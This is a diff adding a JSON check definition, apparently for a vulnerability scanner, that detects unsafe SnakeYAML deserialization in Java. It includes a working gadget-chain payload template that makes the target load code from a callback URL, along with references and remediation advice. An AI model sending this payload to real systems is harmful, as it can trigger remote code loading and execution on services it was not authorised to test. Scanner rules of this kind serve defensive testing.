@@ -1,0 +1,20 @@
+{
+  "id": "m3-blind-deser-java-snakeyaml",
+  "bug_class": "deserialization",
+  "title": "Unsafe YAML load (Java SnakeYAML ScriptEngineManager/URLClassLoader)",
+  "severity": "Critical",
+  "applies_when": {
+    "category": "java"
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://{callback}/\"]]]]"
+  },
+  "references": [
+    "CWE-502",
+    "CAPEC-586"
+  ],
+  "remediation": "Never deserialize untrusted data into arbitrary types. Use allowlist-based deserialization or a data-only format (JSON with a fixed schema), disable polymorphic type handling, and remove/patch the gadget libraries on the classpath. The inbound callback proves the gadget chain executed.",
+  "payload_family": "java-snakeyaml"
+}
